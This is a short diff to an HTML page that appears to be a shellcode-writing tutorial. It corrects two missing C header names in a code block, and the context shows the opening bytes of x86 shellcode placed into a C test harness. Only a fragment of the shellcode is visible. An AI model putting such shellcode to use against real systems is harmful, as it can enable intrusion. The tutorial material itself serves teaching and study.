@@ -474,8 +474,8 @@ Afterwards the produced <it>shellcode</it> will be added into a C program named 
 </p>
 
 <pre style="color: white;background: #000000;border: 1px solid #ddd;border-left: 3px solid #f36d33;page-break-inside: avoid;font-family: Courier New;font-size: 16px;line-height: 1.6;margin-bottom: 1.6em;max-width: 100%;padding: 1em 1.5em;display: block;white-space: pre-wrap;white-space: -moz-pre-wrap;white-space: -pre-wrap;white-space: -o-pre-wrap;word-wrap: break-word;">
-#include 
-#include 
+#include &lt;stdio.h>
+#include &lt;string.h> 
 
 unsigned char code[] = \
  "\x31\xdb\xf7\xe3\x89\x44\x24\xfc\xc7"
